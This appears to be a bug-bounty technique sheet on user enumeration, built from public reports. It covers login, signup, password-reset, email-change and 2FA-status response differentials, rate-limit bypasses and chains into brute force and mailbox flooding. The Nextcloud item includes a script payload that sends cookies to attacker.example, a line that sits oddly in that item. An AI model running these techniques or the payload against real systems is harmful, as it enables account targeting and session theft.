---
name: hunter-l3-user-enumeration
description: "Use when hunting User Enumeration on a target. Loads the L3 technique sheet: User enumeration is the ability to determine, for arbitrary identifiers (emails, usernames), whether an account exists on a target system."
domain: cybersecurity
subdomain: web
tags:
- web
- user-enumeration
- hunting
- l3
version: '1.0'
---

# User Enumeration — Technique Sheet

## Overview

User enumeration is the ability to determine, for arbitrary identifiers (emails, usernames), whether an account exists on a target system. It almost always arises from **differential responses** — different status codes, error strings, response lengths, timings, or downstream flows — between "exists" and "doesn't exist" paths in registration, login, password-reset, and email-change endpoints. It is frequently written up on its own (especially with missing rate limits, or when it feeds phishing/brute-force), and it chains into credential stuffing, password-reset spam/mailbox flooding, XML-RPC/login brute force, and 2FA-status disclosure. Programs with mature triage often rate-limit or neutralize the response — several of these records were accepted precisely because **no rate limit** accompanied the differential.

## Distinct sub-patterns

### 1. Unauthenticated user-listing APIs (no differential needed)

- **Endpoint shape:** `GET /wp-json/wp/v2/users` (WordPress REST API); also CMS/JSON profile endpoints like `GET /?format=json` on Squarespace-hosted sites.
- **Payload:** none — plain unauthenticated GET. Exemplar: `https://uber-movement.squarespace.com/?format=json`.
- **Root cause:** REST API user listing / site JSON exposes the account list without authentication.
- **Impact:** Full username list in one request. On Shopify (id=1147433), the WordPress users endpoint revealed username `asha8fd635db6e9`, which was then used to drive an XML-RPC brute-force attack. On Uber's Squarespace subdomain (id=155578), the JSON endpoint leaked admin-console users `admin@gmail.com` and `jason@jasonbarone.com`.
- **Exemplars:** 1147433 (Shopify), 155578 (Uber).

### 2. Auth-broken user-picker endpoints (CVE-driven)

- **Endpoint shape:** `GET /rest/api/2/user/picker?query={query}` (Jira).
- **Payload (verbatim):** `query=admin`.
- **Root cause:** CVE-2019-3403 — incorrect authorization check on the user picker endpoint; unauthenticated users can query it.
- **Impact:** Remote username enumeration via the picker.
- **Exemplar:** 1147951 (U.S. Dept of Defense). *Takeaway: fingerprint the self-hosted stack (Jira/Confluence/WP) and test known CVEs on enumeration-adjacent endpoints.*

### 3. Login differential (username validity)

- **Endpoint shape:** `POST /wp-admin` (or any login form / `GET /signin` with an email parameter).
- **Payload:** any candidate username; e.g. `admin` on the WordPress login; `admin@slack.com` on Slack's `GET /signin`.
- **Root cause:** Different error strings for bad-username vs bad-password. Canonical pair (id=151583): existing username → `ERROR: The password you entered for the username admin is incorrect.`; non-existing → `Invalid username.`. Slack's variant (id=2766) is behavioral: valid emails are **redirected to a team-selection page**, invalid ones are not.
- **Impact:** Confirmed username existence; Slack variant additionally revealed the **teams associated with a given email**. WordPress enumeration on Nextcloud (id=146093) yielded four valid usernames (`jancborchardt`, `jos`, `lukasreschke`, `frank`) usable for brute force — that report also carried an XSS-style payload in the username field (`<script>document.location='https://attacker.example/steal?c='+document.cookie</script>`) as part of the submission chain.
- **Exemplars:** 151583 (Ian Dunn), 2766 (Slack), 146093 (Nextcloud).

### 4. Registration differential ("email already taken")

- **Endpoint shape:** `POST /users/sign_up`, `POST /accounts/register/`, `POST /apiv1/register`, `POST /en/auth/sign-up`, `POST /signup_submit/`, app registration forms.
- **Payloads (verbatim):**
  - Uber (id=144803): `email=efkan162@gmail.com` to `POST /signup_submit/` — 406 "already registered" vs 200 for new.
  - Unikrn (id=262830): full JSON body to `/apiv1/register`:
    `{"email_address":"hackerone1@gmail.com","day":"1","month":"1","year":"1999","state":null,"password":"a12345678","password_confirm":"a12345678","session_id":null}` — note the email-existence check runs **before** the rate-limit check, so the "Email address already registered" answer arrives before throttling kicks in.
  - Omise (id=666722): `{"email":"<target_email>"}` to `/en/auth/sign-up` — a distinct "Email is invalid" response fired **only** for already-registered emails (misleading error text — don't trust the message's meaning, only its differential).
- **Root cause:** Registration validates uniqueness and returns a distinguishable error before/instead of the generic "check your inbox" flow.
- **Impact:** Bulk confirmation of registered emails; Uber report demonstrated 100+ requests in 3 seconds with zero throttling. HackerOne (id=2494, id=761) both confirmed enumeration via signup even where the forgot-password flow had already been fixed — **signup often outlives the mitigation applied to reset**.
- **Exemplars:** 144803 (Uber), 262830 (Unikrn), 666722 (Omise), 2494/761 (HackerOne), 257035/265441 (Legal Robot), 223343 (Weblate).

### 5. Forgot-password / password-reset differential

The single most common sub-pattern in the records (11+ instances).

- **Endpoint shape:** `POST /forgot`, `POST /forgotpw`, `POST /password-reset`, `POST /api/password-reset`, `POST .../wp-login.php?action=lostpassword`, `POST forgot-password` on app domains.
- **Payloads (verbatim):**
  - C2FO (id=5688): `emailAddress=test%40internetwache.org` to `POST /api/password-reset` — registered → `{inReset:true}`; invalid → `invalid_email_address`.
  - Khan Academy (id=6376): `email=test%40test.de&reset=Reset+password` to `POST /forgotpw` — distinct error for non-existent emails.
- **Root cause:** Reset flow discloses existence via distinct error text (`'No account with that id found.'`, `'E-mail not recognized'`, `'That username or email was not found.'`), status-code differences (WordPress.com: 200 not-found / 302 found / 500 on repeat spam — id=16439), or body-length differences (Smule, id=441161: valid emails produced a different response **and request length**).
- **Impact:** Email-list brute force with no rate limit (Imgur id=91343, Smule id=441161, Legal Robot id=66845); Infogram (id=280509, id=282564) and UPchieve (id=1166054 — HTTP 500 + `'No account with that id found.'`) confirm the same differential. Weblate (id=145734) showed both signup and forgot-password leaking existence.
- **Exemplars:** 1166054, 282564, 441161, 5688, 6376, 66845, 91343, 16439, 280509.

### 6. Email-change / add-email / change-email differential

- **Endpoint shape:** `POST change-email` (Enter, id=47627); `POST /accounts/email/` (Weblate, id=223531); `POST /publishers` with param `publisher[pending_email]` (Brave, id=854793).
- **Payloads (verbatim):**
  - Brave: multipart field `publisher[pending_email]` set to `victimuser280@gmail.com` (trailing boundary `-----------------------------115523927333677217472699996749--`).
  - Weblate: adding an email to an account reveals registration status, with a **reusable CSRF token** enabling unlimited brute force.
- **Root cause:** The endpoint checks whether the *new* email is already registered and returns distinct codes — Brave: **400 for existing vs 200 for non-existing**, with no rate limit; Enter: registered → 500, unregistered → 200, invalid → 400.
- **Impact:** Enter: 350 emails brute-forced via Burp Intruder. Brave: mass enumeration **plus** mailbox flooding — looping the request spams the victim with confirmation emails.
- **Exemplars:** 47627 (Enter), 854793 (Brave), 223531 (Weblate).

### 7. Authenticated enumeration via feature responses

- **Endpoint shape:** `POST /transactions/request_money` (Coinbase, id=5200).
- **Payload:** replayed request with arbitrary email addresses in `transaction[from]`.
- **Root cause:** Responses distinguish Coinbase members from non-members.
- **Impact:** Member vs non-member email differentiation (enumeration) for any logged-in user.
- **Exemplar:** 5207-style chain in record 5200: `replay request` → `observe member vs non-member response`. *Takeaway: any feature that resolves an email to an account (money requests, invites, sharing) is an enumeration oracle once authenticated.*

### 8. 2FA-status disclosure via reset/login flows

- **Endpoint shape:** password-reset flow and login flow (Legal Robot).
- **Payload:** none stated beyond the target email.
- **Root cause:** Two separate leaks: (a) during password reset, 2FA-enabled users were prompted for a second factor (id=249431); (b) during login, 2FA-enabled users got a 2FA prompt **even when the password was wrong** (id=249467).
- **Impact:** Reveals whether a target account has 2FA enabled — a targeting signal for phishing (skip 2FA-hardened accounts, phish the rest) and a security-posture leak.
- **Exemplars:** 249431, 249467 (Legal Robot).

### 9. Username-existence leaks on the platform surface

- **Endpoint shape:** `*.liberapay.com` (any page resolving a username).
- **Payload:** not stated.
- **Root cause:** The service leaks whether a given username exists (likely via profile 404 vs 200 differences).
- **Impact:** Account-existence enumeration — notably **rejected as out-of-scope** per program policy.
- **Exemplar:** 474899 (Liberapay). *Gotcha in itself: see "what NOT to do."*

## Bypass / chain notes

- **Mitigation-bypass via endpoint migration:** HackerOne (id=2494) fixed forgot-password enumeration, but signup still returned "email has already taken" — enumerate through whichever sibling endpoint wasn't fixed. Same theme at Weblate (id=223343: register leaks even though forgot-password didn't).
- **Check-order bypass:** Unikrn (id=262830) — the email-existence check ran **before** the rate-limit check, so a rate limit did not prevent enumeration. Audit which validation fires first.
- **Token-reuse bypass:** Weblate (id=223531) — a reusable CSRF token made the add-email oracle endlessly replayable.
- **Signal-fallback bypass:** Smule (id=441161) — even where response bodies were normalized, request **length** differed between valid/invalid emails. Length and timing survive message unification.
- **Chains seen in records:** enumeration → XML-RPC brute force (1147433); enumeration → team discovery (2766); enumeration → mass password-reset spam (47627); enumeration + no rate limit → mailbox flooding via looping confirmation emails (854793); enumeration → phishing target lists (223343, 47627).
- **Cross-endpoint neutrals don't fix anything:** Legal Robot (id=257035) moved registration to a neutral pending-verification screen — but the reset and login flows (249431, 249467) still leaked data. All identity-revealing flows must be neutralized together.

## Gotchas / what NOT to do

- **Check program scope first.** Liberapay (id=474899) username-existence enumeration was explicitly out-of-scope and non-payable. Many programs treat plain "does this email exist" as low/informational — the bounty-grade angle in these records is almost always **no rate limit + bulk feasibility** (100+ req/3s on Uber; 350 emails via Intruder on Enter; mailbox flooding on Brave) or a downstream chain.
- **Don't trust the error message's literal meaning.** Omise's "Email is invalid" was actually the *account-exists* signal. Map the differential empirically, don't read semantics.
- **Don't stop at one differential channel.** If the text is neutralized, check status codes (Brave 400/200; WordPress.com 200/302/500), body length (Smule), and flow behavior (Slack redirect; Legal Robot 2FA prompt).
- **Don't hammer without testing throttle behavior first** — but note in these records the wins came precisely because no throttle existed; document the request volume you achieved as impact evidence.
- **Don't report existence-only leaks on every program** — frame impact as phishing/brute-force/spam enablement, or add the 2FA-status angle (Legal Robot) where applicable.
- **Payload not stated** for many differential records (1166054, 151583 body payloads, 223343, 2494, 66845, 91343) — the technique is parameterized email/username guessing, not a magic string; build your own wordlist.

## Real-world impact examples

- **Shopify (1147433):** `GET /wp-json/wp/v2/users` exposed username `asha8fd635db6e9`, used directly to drive an XML-RPC brute-force attack.
- **Uber (144803):** `POST /signup_submit/` returned 406 for registered emails, 200 otherwise — 100+ enumeration requests in 3 seconds with zero throttling.
- **Enter (47627):** change-email oracle with three-way discrimination (registered 500 / unregistered 200 / invalid 400) — 350 emails brute-forced via Burp Intruder, enabling mass password-reset spam and targeted advertising.
- **Brave (854793):** `POST /publishers` 400-vs-200 differential, no rate limit — mass email enumeration plus looping the request flooded a victim's mailbox with confirmation emails.
- **Legal Robot (249431/249467):** password reset and login flows disclosed whether an account had 2FA enabled — including a 2FA prompt on login attempts with a wrong password.
- **Slack (2766):** sign-in differential revealed not just account existence but the **teams associated with an arbitrary email**.
- **Nextcloud (146093):** four valid WordPress usernames harvested (`jancborchardt`, `jos`, `lukasreschke`, `frank`), ready for brute force.
- **WordPress.com (16439):** three-state reset oracle (200 not-found / 302 found / 500 on repeat spam) enumerated registered users site-wide.